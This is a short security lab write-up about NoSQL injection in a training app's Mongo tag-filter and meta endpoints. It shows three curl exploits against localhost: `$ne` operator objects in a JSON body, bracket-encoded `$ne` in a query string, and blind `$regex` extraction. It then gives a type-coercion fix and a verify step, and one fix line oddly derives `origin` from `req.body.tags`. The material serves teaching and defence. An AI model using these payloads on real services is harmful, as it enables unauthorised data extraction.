# Lab 03b: NoSQL injection on the Mongo tag filter

`POST /api/tags-filter` and `GET /api/meta` pass user JSON/query straight into Mongo queries. Mongo operators (`$ne`, `$gt`, `$regex`, `$where`) arrive as data and become query structure.

**OWASP Top 10:2025:** [A05 Injection](https://owasp.org/Top10/2025/)

**Code:** `routes/shop.js` (`/api/tags-filter`, `/api/meta`), Mongo collection `product_meta`

## Exploit 1: operator object via JSON body

Log in, then send an operator instead of a value:

```bash
curl -s -b cookies.txt -X POST http://localhost:8888/api/tags-filter \
  -H "Content-Type: application/json" \
  -d '{"tags":{"$ne":null}}'
# count: 12  ← every document, the "value" was never compared
```

## Exploit 2: operator via GET brackets

Express's extended query parser turns `origin[$ne]=null` into `{origin: {$ne: null}}`:

```bash
curl -s -b cookies.txt "http://localhost:8888/api/meta?origin%5B%24ne%5D=null"
```

## Exploit 3: blind with $regex

Character-by-character extraction of any field value:

```bash
curl -s -b cookies.txt "http://localhost:8888/api/meta?origin%5B%24regex%5D=^bar"   # matches barcelona
```

## Why it happens

User input crosses the data/query boundary. In SQL it is the string/SQL boundary; in Mongo it is the JSON/operator boundary.

## Fix

Coerce to the exact expected type **before** the query:

```js
const origin = String(req.body.tags || "").slice(0, 50);
const filter = { origin };                 // a string, never an object
// or for the body form:
const tags = Array.isArray(req.body.tags) ? req.body.tags.map(String) : [];
```

Disable the extended query parser for API routes (`query parser: 'simple'`) to kill bracket-operator smuggling.

## Verify

`{"tags":{"$ne":null}}` now returns `count: 0` (string comparison of the literal), and `origin[$ne]=null` returns the same as any unknown origin.